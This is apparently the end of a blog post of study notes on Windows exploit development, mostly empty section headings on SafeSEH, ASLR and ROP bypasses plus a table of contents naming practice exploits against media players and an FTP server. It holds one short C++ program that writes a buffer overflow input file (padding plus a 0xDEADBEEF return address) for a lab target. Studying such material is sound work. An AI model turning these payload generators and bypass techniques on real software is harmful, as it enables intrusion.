<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//attack_sc.cpp<br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br>#include &lt;string&gt;<br><br>using namespace std;<br><br>#define FILENAME &quot;vulnerable_sc_exploit.txt&quot;<br><br>int main() &#123;<br>	string global_junk(&quot;junk\n&quot;);<br>	string local_junk(128 + 4 + 4, &#x27;A&#x27;);<br>	local_junk += &quot;\xEF\xBE\xAD\xDE&quot;;<br><br>	ofstream fout(FILENAME, ios::binary);<br>	fout &lt;&lt; global_junk &lt;&lt; local_junk;<br><br>	cout &lt;&lt; &quot;OK: &quot; &lt;&lt; FILENAME &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure>
<hr>
<h3 id="An-Exception-that-can-Bypass-Security-Cookie"><a href="#An-Exception-that-can-Bypass-Security-Cookie" class="headerlink" title="An Exception that can Bypass Security Cookie"></a>An Exception that can Bypass Security Cookie</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"><br></code></pre></td></tr></table></figure>
<h2 id="6-2-Safe-Virtual-Function"><a href="#6-2-Safe-Virtual-Function" class="headerlink" title="6.2 - Safe Virtual Function"></a>6.2 - Safe Virtual Function</h2><h2 id="6-3-SafeSEH"><a href="#6-3-SafeSEH" class="headerlink" title="6.3 - SafeSEH"></a>6.3 - SafeSEH</h2><h2 id="6-4-Exploiting-SafeSEH"><a href="#6-4-Exploiting-SafeSEH" class="headerlink" title="6.4 - Exploiting SafeSEH"></a>6.4 - Exploiting SafeSEH</h2><h2 id="6-5-SEHOP"><a href="#6-5-SEHOP" class="headerlink" title="6.5 - SEHOP"></a>6.5 - SEHOP</h2><h2 id="6-6-Exploiting-SEHOP"><a href="#6-6-Exploiting-SEHOP" class="headerlink" title="6.6 - Exploiting SEHOP"></a>6.6 - Exploiting SEHOP</h2><h2 id="6-7-DEP-and-ASLR"><a href="#6-7-DEP-and-ASLR" class="headerlink" title="6.7 - DEP and ASLR"></a>6.7 - DEP and ASLR</h2><h2 id="6-8-Exploiting-ASLR"><a href="#6-8-Exploiting-ASLR" class="headerlink" title="6.8 - Exploiting ASLR"></a>6.8 - Exploiting ASLR</h2><p>Exploit other DLL without SafeSEH or ASLR.</p>
<h2 id="6-9-Are-Windows-8-and-Windows-10-Safe"><a href="#6-9-Are-Windows-8-and-Windows-10-Safe" class="headerlink" title="6.9 - Are Windows 8 and Windows 10 Safe?"></a>6.9 - Are Windows 8 and Windows 10 Safe?</h2><h2 id="6-10-ROP-Return-Oriented-Programming"><a href="#6-10-ROP-Return-Oriented-Programming" class="headerlink" title="6.10 - ROP (Return-Oriented Programming)"></a>6.10 - ROP (Return-Oriented Programming)</h2><h2 id="6-11-Six-Ways-to-Exploit-ROP"><a href="#6-11-Six-Ways-to-Exploit-ROP" class="headerlink" title="6.11 - Six Ways to Exploit ROP"></a>6.11 - Six Ways to Exploit ROP</h2><h3 id="1-ZwSetInformationProcess"><a href="#1-ZwSetInformationProcess" class="headerlink" title="1. ZwSetInformationProcess"></a>1. ZwSetInformationProcess</h3><h3 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h3><h3 id="Auxiliary——ByteArray"><a href="#Auxiliary——ByteArray" class="headerlink" title="Auxiliary——ByteArray"></a>Auxiliary——ByteArray</h3><h3 id="2-SetProcessDEPPolicy"><a href="#2-SetProcessDEPPolicy" class="headerlink" title="2. SetProcessDEPPolicy"></a>2. SetProcessDEPPolicy</h3><h3 id="3-VirtualProtect"><a href="#3-VirtualProtect" class="headerlink" title="3. VirtualProtect"></a>3. VirtualProtect</h3><h3 id="4-WriteProcessMemory"><a href="#4-WriteProcessMemory" class="headerlink" title="4. WriteProcessMemory"></a>4. WriteProcessMemory</h3><h3 id="5-and-6-ROP-serializing-Multiple-Functions"><a href="#5-and-6-ROP-serializing-Multiple-Functions" class="headerlink" title="5 and 6. ROP serializing Multiple Functions"></a>5 and 6. ROP serializing Multiple Functions</h3><h2 id="6-12-FinalDefence-exe"><a href="#6-12-FinalDefence-exe" class="headerlink" title="6.12 - FinalDefence.exe"></a>6.12 - FinalDefence.exe</h2><h2 id="6-13-Only-Windows-7-x64"><a href="#6-13-Only-Windows-7-x64" class="headerlink" title="6.13 - Only Windows 7 x64?"></a>6.13 - Only Windows 7 x64?</h2><h2 id="6-14-Practice——KMPlayer"><a href="#6-14-Practice——KMPlayer" class="headerlink" title="6.14 - Practice——KMPlayer"></a>6.14 - Practice——KMPlayer</h2><h2 id="6-15-Not-Only-“Hello-World”"><a href="#6-15-Not-Only-“Hello-World”" class="headerlink" title="6.15 - Not Only “Hello World”"></a>6.15 - Not Only “Hello World”</h2><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="400">
</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2026/01/02/2026-1-2-NoteMasteringCppPointer/">← Next [Book] Mastering C/C++ Pointer</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/01/02/2026-1-2-NoteCpp20forProgrammers/">[Book] C++ 20 for Programmers - An Objects-Natural Appraoch Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/" width="200" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/"><i class="fab fa-github" alt="GitHub"></i></a></div></div><div id="music"></div><div class="music-box"><hr style="border:1px solid #ccc; margin:10px 0"><p class="music-title">Feeling exhausted? Let's enjoy (やさしい) music!</p><p style="text-align:center"><img class="music-anime" src="/images/meme/himari_coffee.2.jpg" width="150" height="200"></p><div><button class="music-btn" id="music-toggle">▶ Play Music</button><span id="music-index" style="margin-left:10px"></span></div><hr style="border:1px solid #ccc; margin:10px 0"><audio id="bg-music"><source src="/mp3/music/music_1.mp3" type="audio/mpeg"></audio><script>document.addEventListener("DOMContentLoaded", function () {
  var playlist = [
    "/mp3/music/music_1.mp3",
    "/mp3/music/sugar_story.mp3",
    "/mp3/music/story_music_box.mp3",
    "/mp3/music/musa.mp3",
    "/mp3/music/air.mp3",
    "/mp3/music/last_page.mp3",
  ];

  var current = 0;
  const audio = document.getElementById("bg-music");
  const btn = document.getElementById("music-toggle");
  const indexDisplay = document.getElementById("music-index");

  indexDisplay.innerText = `Currently: ${current + 1} / ${playlist.length}`;

  btn.addEventListener("click", function () {
    if (audio.paused) {
      audio.src = playlist[current];
      audio.play();
      btn.innerText = "⏸ Pause Music";
    } else {
      audio.pause();
      btn.innerText = "▶ Play Music";
    }
  });

  audio.addEventListener("ended", function() {
    current = (current + 1) % playlist.length;
    audio.src = playlist[current];
    audio.play();
    indexDisplay.innerText = `Currently: ${current + 1} / ${playlist.length}`;
  });
});</script></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#El-libro"><span class="toc-number">1.</span> <span class="toc-text">El libro</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">2.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reflection"><span class="toc-number">3.</span> <span class="toc-text">Reflection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chapter-1-Set-Up"><span class="toc-number">4.</span> <span class="toc-text">Chapter 1 - Set Up</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-VM-and-Windos-XP-SP3"><span class="toc-number">4.1.</span> <span class="toc-text">1.1 - VM and Windos XP SP3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-Tools"><span class="toc-number">4.2.</span> <span class="toc-text">1.2 - Tools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dev-C"><span class="toc-number">4.2.1.</span> <span class="toc-text">Dev-C++</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Visual-C-2010-Express"><span class="toc-number">4.2.2.</span> <span class="toc-text">Visual C++ 2010 Express</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Visual-C-2013-Express"><span class="toc-number">4.2.3.</span> <span class="toc-text">Visual C++ 2013 Express</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NASM"><span class="toc-number">4.2.4.</span> <span class="toc-text">NASM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OllyDbg"><span class="toc-number">4.2.5.</span> <span class="toc-text">OllyDbg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinDbg"><span class="toc-number">4.2.6.</span> <span class="toc-text">WinDbg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Immunity-Debugger"><span class="toc-number">4.2.7.</span> <span class="toc-text">Immunity Debugger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CFF-Explorer"><span class="toc-number">4.2.8.</span> <span class="toc-text">CFF Explorer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HxD"><span class="toc-number">4.2.9.</span> <span class="toc-text">HxD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Process-Explorer"><span class="toc-number">4.2.10.</span> <span class="toc-text">Process Explorer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit"><span class="toc-number">4.2.11.</span> <span class="toc-text">Metasploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chapter-2-Change-the-Procedure-of-a-Program"><span class="toc-number">5.</span> <span class="toc-text">Chapter 2 - Change the Procedure of a Program</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-Change-the-Procedure-of-a-Program-via-Buffer-Overflow"><span class="toc-number">5.1.</span> <span class="toc-text">2.2 - Change the Procedure of a Program via Buffer Overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-Debugging-with-OllyDbg"><span class="toc-number">5.2.</span> <span class="toc-text">2.3 - Debugging with OllyDbg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-Basic-Buffer-Overflow"><span class="toc-number">5.3.</span> <span class="toc-text">2.4 - Basic Buffer Overflow</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chapter-3-Change-the-Action-of-a-Program"><span class="toc-number">6.</span> <span class="toc-text">Chapter 3 - Change the Action of a Program</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-From-C-Language-to-Shellcode"><span class="toc-number">6.1.</span> <span class="toc-text">3.2 - From C Language to Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-Using-Plugin-to-Obtain-Shellcode"><span class="toc-number">6.2.</span> <span class="toc-text">3.3 - Using Plugin to Obtain Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-Using-nasm-shell-rb-from-Metasploit-to-Obtain-Shellcode"><span class="toc-number">6.3.</span> <span class="toc-text">3.4 - Using nasm_shell.rb from Metasploit to Obtain Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-Using-NASM-to-Obtain-Shellcode"><span class="toc-number">6.4.</span> <span class="toc-text">3.5 - Using NASM to Obtain Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-Review-the-First-Shellcode"><span class="toc-number">6.5.</span> <span class="toc-text">3.6 - Review the First Shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Obtain-the-ImageBase-Address-of-kernel32-dll-via-PEB"><span class="toc-number">6.5.1.</span> <span class="toc-text">Obtain the ImageBase Address of kernel32.dll via PEB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Obtain-LoadLibraryA-from-the-ImageBase-of-kernel32-dll"><span class="toc-number">6.5.2.</span> <span class="toc-text">Obtain LoadLibraryA() from the ImageBase of kernel32.dll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Hash-Value-of-a-Function"><span class="toc-number">6.5.3.</span> <span class="toc-text">The Hash Value of a Function</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7-Metasploit-Payload%E2%80%94%E2%80%94Hello-World-MessageBox"><span class="toc-number">6.6.</span> <span class="toc-text">3.7 - Metasploit Payload——Hello World! MessageBox()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-8-The-differences-of-Windows-Operating-Systems-x32-and-x64"><span class="toc-number">6.7.</span> <span class="toc-text">3.8 - The differences of Windows Operating Systems, x32 and x64</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chapter-4-Practical-Attack"><span class="toc-number">7.</span> <span class="toc-text">Chapter 4 - Practical Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-Different-Operating-Systems-and-Compilers"><span class="toc-number">7.1.</span> <span class="toc-text">4.1 - Different Operating Systems and Compilers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-Example-C-Language"><span class="toc-number">7.2.</span> <span class="toc-text">4.2 - Example: C Language</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-Example-From-C-Language-to-C"><span class="toc-number">7.3.</span> <span class="toc-text">4.3 - Example: From C Language to C++</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-Example-Attacking-Network-Applications"><span class="toc-number">7.4.</span> <span class="toc-text">4.4 - Example: Attacking Network Applications</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5-Practice-KMPlayer"><span class="toc-number">7.5.</span> <span class="toc-text">4.5 - Practice: KMPlayer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-6-Practice-DVD-X-Player"><span class="toc-number">7.6.</span> <span class="toc-text">4.6 - Practice: DVD X Player</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-7-Practice-Easy-File-Sharing-FTP-Server"><span class="toc-number">7.7.</span> <span class="toc-text">4.7 - Practice: Easy File Sharing FTP Server</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-8-Practice-Apple-QuickTime"><span class="toc-number">7.8.</span> <span class="toc-text">4.8 - Practice: Apple QuickTime</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chapter-5-Changes-of-Attacking"><span class="toc-number">8.</span> <span class="toc-text">Chapter 5 - Changes of Attacking</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-Principles-of-Exception-Handling-Attack"><span class="toc-number">8.1.</span> <span class="toc-text">5.1 - Principles of Exception Handling Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Practice-Vulnerable001"><span class="toc-number">8.1.1.</span> <span class="toc-text">Practice - Vulnerable001</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Practice-Wireshark-1-4-4"><span class="toc-number">8.1.2.</span> <span class="toc-text">Practice - Wireshark 1.4.4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-Egg-Hunt"><span class="toc-number">8.2.</span> <span class="toc-text">5.2 - Egg Hunt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NtDisplayString"><span class="toc-number">8.2.1.</span> <span class="toc-text">NtDisplayString</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NtAccessCheckAndAlarm"><span class="toc-number">8.2.2.</span> <span class="toc-text">NtAccessCheckAndAlarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Egg-Hunt-Practice"><span class="toc-number">8.2.3.</span> <span class="toc-text">Egg Hunt Practice</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Egg-Hunt-Practice%E2%80%94%E2%80%94Kolibri-Web-Server"><span class="toc-number">8.2.4.</span> <span class="toc-text">Egg Hunt Practice——Kolibri Web Server</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-%E2%80%93-Unicode-Based-Exploitation-Techniques"><span class="toc-number">8.3.</span> <span class="toc-text">5.3 – Unicode-Based Exploitation Techniques</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Principle"><span class="toc-number">8.3.1.</span> <span class="toc-text">Principle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Practice"><span class="toc-number">8.3.2.</span> <span class="toc-text">Practice</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Practice%E2%80%94%E2%80%94GOM-Player"><span class="toc-number">8.3.3.</span> <span class="toc-text">Practice——GOM Player</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chapter-6-Offensive-and-Defensive"><span class="toc-number">9.</span> <span class="toc-text">Chapter 6 - Offensive and Defensive</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#6-1-Security-Cookie"><span class="toc-number">9.1.</span> <span class="toc-text">6.1 - Security Cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-Security-Cookie"><span class="toc-number">9.1.1.</span> <span class="toc-text">Exploiting Security Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#An-Exception-that-can-Bypass-Security-Cookie"><span class="toc-number">9.1.2.</span> <span class="toc-text">An Exception that can Bypass Security Cookie</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-2-Safe-Virtual-Function"><span class="toc-number">9.2.</span> <span class="toc-text">6.2 - Safe Virtual Function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-3-SafeSEH"><span class="toc-number">9.3.</span> <span class="toc-text">6.3 - SafeSEH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-4-Exploiting-SafeSEH"><span class="toc-number">9.4.</span> <span class="toc-text">6.4 - Exploiting SafeSEH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-5-SEHOP"><span class="toc-number">9.5.</span> <span class="toc-text">6.5 - SEHOP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-6-Exploiting-SEHOP"><span class="toc-number">9.6.</span> <span class="toc-text">6.6 - Exploiting SEHOP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-7-DEP-and-ASLR"><span class="toc-number">9.7.</span> <span class="toc-text">6.7 - DEP and ASLR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-8-Exploiting-ASLR"><span class="toc-number">9.8.</span> <span class="toc-text">6.8 - Exploiting ASLR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-9-Are-Windows-8-and-Windows-10-Safe"><span class="toc-number">9.9.</span> <span class="toc-text">6.9 - Are Windows 8 and Windows 10 Safe?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-10-ROP-Return-Oriented-Programming"><span class="toc-number">9.10.</span> <span class="toc-text">6.10 - ROP (Return-Oriented Programming)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-11-Six-Ways-to-Exploit-ROP"><span class="toc-number">9.11.</span> <span class="toc-text">6.11 - Six Ways to Exploit ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-ZwSetInformationProcess"><span class="toc-number">9.11.1.</span> <span class="toc-text">1. ZwSetInformationProcess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Advanced"><span class="toc-number">9.11.2.</span> <span class="toc-text">Advanced</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Auxiliary%E2%80%94%E2%80%94ByteArray"><span class="toc-number">9.11.3.</span> <span class="toc-text">Auxiliary——ByteArray</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SetProcessDEPPolicy"><span class="toc-number">9.11.4.</span> <span class="toc-text">2. SetProcessDEPPolicy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-VirtualProtect"><span class="toc-number">9.11.5.</span> <span class="toc-text">3. VirtualProtect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-WriteProcessMemory"><span class="toc-number">9.11.6.</span> <span class="toc-text">4. WriteProcessMemory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-and-6-ROP-serializing-Multiple-Functions"><span class="toc-number">9.11.7.</span> <span class="toc-text">5 and 6. ROP serializing Multiple Functions</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-12-FinalDefence-exe"><span class="toc-number">9.12.</span> <span class="toc-text">6.12 - FinalDefence.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-13-Only-Windows-7-x64"><span class="toc-number">9.13.</span> <span class="toc-text">6.13 - Only Windows 7 x64?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-14-Practice%E2%80%94%E2%80%94KMPlayer"><span class="toc-number">9.14.</span> <span class="toc-text">6.14 - Practice——KMPlayer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-15-Not-Only-%E2%80%9CHello-World%E2%80%9D"><span class="toc-number">9.15.</span> <span class="toc-text">6.15 - Not Only “Hello World”</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#THANKS-FOR-READING"><span class="toc-number">10.</span> <span class="toc-text">THANKS FOR READING</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>